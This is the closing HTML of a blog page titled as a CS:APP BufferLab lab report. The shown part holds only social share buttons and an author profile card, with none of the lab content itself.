                    <i class="fa fa-weibo" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/&amp;title=深入理解计算机系统BufferLab实验报告" title="分享到 QQ">
                    <i class="fa fa-qq" aria-hidden="true"></i>
                </a>
            </li>
        
            
            
            <li class="post-action hide-xs">
                <a class="post-action-btn btn btn--default" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/" title="分享到 Qzone">
                    <i class="fa fa-star" aria-hidden="true"></i>
                </a>
            </li>
        
        
            
        
        <li class="post-action">
            
                <a class="post-action-btn btn btn--default" href="#" aria-label="Nach oben">
            
                <i class="fa fa-list" aria-hidden="true"></i>
            </a>
        </li>
    </ul>
</div>


                </div>
                <div id="share-options-bar" class="share-options-bar" data-behavior="4">
    <i id="btn-close-shareoptions" class="fa fa-close"></i>
    <ul class="share-options">
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/">
                    <i class="fa fa-facebook-official" aria-hidden="true"></i><span>分享到 Facebook</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="https://twitter.com/intent/tweet?text=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/">
                    <i class="fa fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://service.weibo.com/share/share.php?&amp;title=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/">
                    <i class="fa fa-weibo" aria-hidden="true"></i><span>分享到 Weibo</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/&amp;title=深入理解计算机系统BufferLab实验报告">
                    <i class="fa fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
                </a>
            </li>
        
            
            
            <li class="share-option">
                <a class="share-option-btn" target="new" href="http://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://blog.codedragon.tech/2017/05/16/深入理解计算机系统BufferLab实验报告/">
                    <i class="fa fa-star" aria-hidden="true"></i><span>分享到 Qzone</span>
                </a>
            </li>
        
    </ul>
</div>

            
        </div>
        


    
        
    

<div id="about">
    <div id="about-card">
        <div id="about-btn-close">
            <i class="fa fa-remove"></i>
        </div>
        
            <img id="about-card-picture" src="/assets/images/avatar.jpg" alt="作者的图片"/>
        
            <h4 id="about-card-name">码龙黑曜</h4>
        
            <div id="about-card-bio"><p>iOS开发者/计算机科学/兽人控</p>
</div>
        
        
            <div id="about-card-job">
                <i class="fa fa-briefcase"></i>
                <br/>
                <p>华中科技大学 本科在读</p>

            </div>
        
        
            <div id="about-card-location">
                <i class="fa fa-map-marker"></i>
                <br/>
                Wuhan, China
            </div>
        
    </div>
</div>

        
        
<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
        <!--SCRIPTS-->
<script src="/assets/js/script-feiabjni254mgbxiozwsjblcsiodjqohurk0dcfkq0aooroewq6bvkdnadrg.min.js"></script>
<!--SCRIPTS END-->

    



    </body>
</html>
